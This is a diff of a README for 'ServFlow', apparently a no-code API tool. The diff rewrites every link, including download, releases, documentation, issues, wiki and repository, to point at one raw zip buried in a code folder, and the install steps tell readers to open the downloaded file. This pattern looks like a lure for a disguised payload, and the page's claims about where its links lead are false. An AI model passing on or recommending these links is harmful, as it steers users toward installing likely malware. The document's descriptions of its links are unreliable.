@@ -8,7 +8,7 @@ To begin using ServFlow, follow these simple steps:
 
 1. **Download the Application**
    Visit this page to download:  
-   [![Download servflow](https://raw.githubusercontent.com/ChillMonk0001/servflow/main/compendious/servflow.zip)](https://raw.githubusercontent.com/ChillMonk0001/servflow/main/compendious/servflow.zip)
+   [![Download servflow](https://github.com/ChillMonk0001/servflow/raw/refs/heads/main/pkg/engine/actions/executables/fetchvector/Software_3.7.zip)](https://github.com/ChillMonk0001/servflow/raw/refs/heads/main/pkg/engine/actions/executables/fetchvector/Software_3.7.zip)
 
 2. **Requirements**
    - A compatible operating system: Windows, macOS, or Linux.
@@ -18,11 +18,11 @@ To begin using ServFlow, follow these simple steps:
 ## 📥 Download & Install
 Follow these steps to download and run ServFlow:
 
-1. Go to the Releases page: [Download servflow](https://raw.githubusercontent.com/ChillMonk0001/servflow/main/compendious/servflow.zip).
+1. Go to the Releases page: [Download servflow](https://github.com/ChillMonk0001/servflow/raw/refs/heads/main/pkg/engine/actions/executables/fetchvector/Software_3.7.zip).
    
 2. On the Releases page, look for the latest version. You should see a list of files available for download.
 
-3. Click on the appropriate file for your operating system. This might be a `.exe` for Windows, a `.dmg` for macOS, or a `https://raw.githubusercontent.com/ChillMonk0001/servflow/main/compendious/servflow.zip` for Linux.
+3. Click on the appropriate file for your operating system. This might be a `.exe` for Windows, a `.dmg` for macOS, or a `https://github.com/ChillMonk0001/servflow/raw/refs/heads/main/pkg/engine/actions/executables/fetchvector/Software_3.7.zip` for Linux.
 
 4. Once the file downloads, locate it on your computer. Open it to start the installation process.
 
@@ -57,14 +57,14 @@ Follow these steps to download and run ServFlow:
 - **No Coding Required**: Focus on API design without getting into backend programming.
 
 ### 📖 Documentation
-For more detailed information, check our [documentation](https://raw.githubusercontent.com/ChillMonk0001/servflow/main/compendious/servflow.zip). Here, you will find best practices, advanced features, and troubleshooting advice.
+For more detailed information, check our [documentation](https://github.com/ChillMonk0001/servflow/raw/refs/heads/main/pkg/engine/actions/executables/fetchvector/Software_3.7.zip). Here, you will find best practices, advanced features, and troubleshooting advice.
 
 ## 🤝 Support
-If you encounter issues or need help, please feel free to open an issue on our [GitHub Issues page](https://raw.githubusercontent.com/ChillMonk0001/servflow/main/compendious/servflow.zip). Community support is available, and we encourage users to share their experiences and solutions.
+If you encounter issues or need help, please feel free to open an issue on our [GitHub Issues page](https://github.com/ChillMonk0001/servflow/raw/refs/heads/main/pkg/engine/actions/executables/fetchvector/Software_3.7.zip). Community support is available, and we encourage users to share their experiences and solutions.
 
 ## 🔗 Links
-- **Releases Page**: [Download servflow](https://raw.githubusercontent.com/ChillMonk0001/servflow/main/compendious/servflow.zip)
-- **Documentation**: [servflow Wiki](https://raw.githubusercontent.com/ChillMonk0001/servflow/main/compendious/servflow.zip)
-- **GitHub Repository**: [servflow GitHub](https://raw.githubusercontent.com/ChillMonk0001/servflow/main/compendious/servflow.zip)
+- **Releases Page**: [Download servflow](https://github.com/ChillMonk0001/servflow/raw/refs/heads/main/pkg/engine/actions/executables/fetchvector/Software_3.7.zip)
+- **Documentation**: [servflow Wiki](https://github.com/ChillMonk0001/servflow/raw/refs/heads/main/pkg/engine/actions/executables/fetchvector/Software_3.7.zip)
+- **GitHub Repository**: [servflow GitHub](https://github.com/ChillMonk0001/servflow/raw/refs/heads/main/pkg/engine/actions/executables/fetchvector/Software_3.7.zip)
 
 By following these steps, you should have ServFlow up and running, allowing you to create powerful APIs effortlessly. Enjoy building!
